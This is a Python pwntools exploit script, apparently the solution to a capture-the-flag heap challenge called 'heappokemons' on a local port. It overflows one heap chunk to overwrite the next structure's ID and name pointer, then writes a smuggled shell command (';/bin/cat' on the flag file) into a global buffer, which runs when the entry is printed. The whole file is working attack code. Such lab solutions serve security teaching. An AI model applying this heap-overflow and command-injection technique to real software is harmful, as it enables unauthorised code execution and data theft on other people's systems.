#!/usr/bin/python3
import pwn

pwn.context(encoding='utf-8', log_level='warning')
io = pwn.remote('127.0.0.1', 1337)

# Create pokemon #0, with known length and position on the heap
io.sendlineafter("Input: ", "1")
io.sendlineafter("Pokemon Name Size: ", "16")
io.sendlineafter("New Pokemon Name: ", "AAAAAAAAAAAAAAA")

# Create pokemon #1, with known length and position on the heap
io.sendlineafter("Input: ", "1")
io.sendlineafter("Pokemon Name Size: ", "16")
io.sendlineafter("New Pokemon Name: ", "BBBBBBBBBBBBBBB")

# "Rename" pokemon #0, which actually updates ID and pointer in POKEMONS[1]
payload1  = b'AAAAAAAAAAAAAAA\x00'               # Keep the original name
payload1 += b'YYYYYYYY'                          # Overwrite chunk spare bytes
payload1 += b'\x21\x00\x00\x00\x00\x00\x00\x00'  # Preserve next chunk header
payload1 += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # POKEMONS[1]->pokemon_id = 0
payload1 += pwn.p64(0x4040a0)                    # POKEMONS[1]->name = &pokemon_names
io.sendlineafter("Input: ", "2")
io.sendlineafter("Pokemon Index: ", "0")
io.sendlineafter("New Pokemon Name: ", payload1)

# "Rename" pokemon #1, changing &pokemon_names[0] to a shell command
io.sendlineafter("Input: ", "2")
io.sendlineafter("Pokemon Index: ", "1")
io.sendlineafter("New Pokemon Name: ", ";/bin/cat /home/heappokemons/flag\0")

# "Print" pokemon #1, which will execute the "failed" command and then, ours
io.sendlineafter("Input: ", "3")
io.sendlineafter("Pokemon Index: ", "1")
io.recvuntil("cyberskills23{")

# Here comes the flag!
print("cyberskills23{"+io.recvuntilS("}"))
io.close()

